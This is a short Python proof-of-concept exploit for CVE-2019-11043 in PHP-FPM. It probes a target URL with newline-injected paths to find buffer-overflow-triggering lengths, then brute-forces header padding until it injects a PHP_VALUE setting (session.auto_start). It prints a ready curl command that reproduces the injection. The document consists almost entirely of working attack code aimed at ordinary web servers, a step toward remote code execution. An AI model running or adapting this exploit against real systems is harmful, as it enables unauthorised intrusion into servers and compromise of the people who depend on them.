"""
In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of 
FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI 
protocol data, thus opening the possibility of remote code execution.

"""

import requests
import sys

target = "http://localhost.local:80/index.php"
loop = True
vuln_lengths = []
header_length = 1

# find potentially vulnerable lengths
for x in range(1500,2000):
	finder = requests.get(target+"/PHP%0Ainfooooooooooooooooooo.php?"+("Q"*x), 
					   headers={"User-Agent":"CVE-2019-11043","Foo":"A", "Ebut":"qazxs edcvf"})
	if finder.status_code >= 500:
		print("lenght:"+str(x)+" status:"+str(finder.status_code))
		vuln_lengths.append(x)

# create list of all potential lengths
vuln_list = [(vuln_lengths[-1] -10), (vuln_lengths[-1] -5), vuln_lengths[-1]]

# iter all potential url lengths 
for length in vuln_list:
	# loop all potential header lengths until session.auto_start is executed
	while loop:
		poison = requests.get(target+"/PHP_VALUE%0Asession.auto_start=1;;;?"+("P"*length),
			headers={
				"User-Agent":"CVE-2019-11043",
				"Foo":("H"*header_length),
				"Ebut":"qazxs edcvf"
		})
		check = requests.get(target+"/PHP_VALUE%0Asession.auto_start=1;;;?"+("C"*length),
			headers={
				"User-Agent":"CVE-2019-11043",
				"Foo":("D"*header_length),
				"Ebut":"qazxs edcvf"
		})
		if "Set-Cookie" in check.headers and "PHPSESSID" in check.headers["Set-Cookie"]:
			print("curl -H 'User-Agent: CVE-2019-11043' -H 'Foo: " \
				+("A"*header_length)+"' -H 'Ebut: qazxs edcvf' '"+target+"/PHP_VALUE%0Asession.auto_start=1;;;?" \
				+("U"*length)+"' ")
			break


		header_length = (header_length+1)

		if header_length > 556:
			header_length = 1
			break

